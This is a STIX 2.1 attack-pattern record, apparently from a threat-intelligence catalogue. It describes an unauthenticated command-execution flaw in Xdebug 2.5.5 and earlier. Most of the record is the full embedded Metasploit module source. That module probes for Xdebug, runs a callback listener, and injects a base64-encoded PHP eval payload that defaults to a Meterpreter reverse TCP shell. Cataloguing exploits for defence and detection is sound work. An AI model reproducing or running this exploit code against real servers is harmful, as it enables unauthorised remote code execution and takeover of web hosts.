{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--09a1d5ff-d0f9-4e11-9525-941f3daff1b0",
    "created": "2024-08-14T17:14:44.839703Z",
    "modified": "2024-08-14T17:14:44.839707Z",
    "name": "xdebug Unauthenticated OS Command Execution",
    "description": " Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user.  'DisclosureDate' => '2017-09-17'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/xdebug_unauth_exec.rb",
            "external_id": "xdebug_unauth_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/"
        },
        {
            "source_name": "reference",
            "url": "https://paper.seebug.org/397/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  include Rex::Proto::Http\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'xdebug Unauthenticated OS Command Execution',\n      'Description' => %q{\n       Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below.\n       This allows the attacker to execute arbitrary php code as the context of the web user.\n      },\n      'DisclosureDate' => '2017-09-17',\n      'Author' => [\n        'Ricter Zheng', #Discovery https://twitter.com/RicterZ\n        'Shaksham Jaiswal', # MinatoTW\n        'Mumbai' # Austin Hudson\n      ],\n      'References' => [\n        ['URL', 'https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/'],\n        ['URL', 'https://paper.seebug.org/397/']\n      ],\n      'License' => MSF_LICENSE,\n      'Platform' => 'php',\n      'Arch' => [ARCH_PHP],\n      'DefaultTarget' => 0,\n      'Stance' => Msf::Exploit::Stance::Aggressive,\n      'DefaultOptions' => {\n        'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n      },\n      'Payload' => {\n        'DisableNops' => true,\n      },\n      'Targets' => [[ 'Automatic', {} ]],\n    ))\n\n    register_options([\n        OptString.new('PATH', [ true, \"Path to target webapp\", \"/index.php\"]),\n        OptAddress.new('SRVHOST', [ true, \"Callback host for accepting connections\", \"0.0.0.0\"]),\n        OptInt.new('SRVPORT', [true, \"Port to listen for the debugger\", 9000]),\n        Opt::RPORT(80),\n    ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => datastore[\"PATH\"],\n        'method' => 'GET',\n          'vars_get' => {\n          'XDEBUG_SESSION_START' => rand_text_alphanumeric(10)\n       }\n      })\n      vprint_status \"Request sent\\n#{res}\"\n      if res && res.headers.to_s =~ /XDEBUG/i\n        vprint_good(\"Looks like remote server has xdebug enabled\\n\")\n        return CheckCode::Detected\n      else\n        return CheckCode::Safe\n      end\n      rescue Rex::ConnectionError\n        return CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    payl = Rex::Text.encode_base64(\"#{payload.encoded}\")\n    cmd1 = \"eval -i 1 -- \" + Rex::Text.encode_base64(\"eval(base64_decode(\\\"#{payl}\\\"));\") + \"\\x00\"\n    webserver = Thread.new do\n    begin\n      server = Rex::Socket::TcpServer.create(\n        'LocalPort' => datastore['SRVPORT'],\n        'LocalHost' => datastore['SRVHOST'],\n        'Context' => {\n          'Msf' => framework,\n          'MsfExploit' => self\n      })\n\n      client = server.accept\n      print_status(\"Waiting for client response.\")\n      data = client.recv(1024)\n      print_status(\"Receiving response\")\n      vprint_line(data)\n      print_status(\"Shell might take upto a minute to respond.Please be patient.\")\n      print_status(\"Sending payload of size #{cmd1.length} bytes\")\n      client.write(cmd1)\n      client.close\n      server.close\n      webserver.exit\n    ensure\n      webserver.exit\n    end\n    end\n    send_request_cgi({\n        'uri' => datastore['PATH'],\n        'method' => 'GET',\n        'headers' => {\n          'X-Forwarded-For' => \"#{lhost}\",\n          'Cookie' => 'XDEBUG_SESSION='+rand_text_alphanumeric(10)\n        }\n    })\n  end\nend\n",
    "x_mitre_platforms": [
        "php'"
    ]
}